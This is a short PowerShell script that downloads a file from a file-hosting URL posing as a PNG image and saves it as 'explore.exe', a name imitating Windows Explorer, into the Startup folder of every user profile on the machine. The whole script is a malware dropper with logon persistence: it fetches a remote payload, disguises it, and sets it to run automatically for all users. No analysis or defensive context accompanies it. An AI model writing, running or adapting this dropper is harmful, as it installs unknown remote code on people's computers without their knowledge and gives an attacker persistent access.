$DownloadURL = "https://files.catbox.moe/6gruhh.png"

$UsersFolder = "C:\Users"

Get-ChildItem -Directory $UsersFolder | ForEach-Object {
    $UserProfile = $_.FullName
    $StartupPath = Join-Path -Path $UserProfile -ChildPath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"

    if (Test-Path -Path (Split-Path -Parent $StartupPath)) {
        Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $StartupPath
    }
}


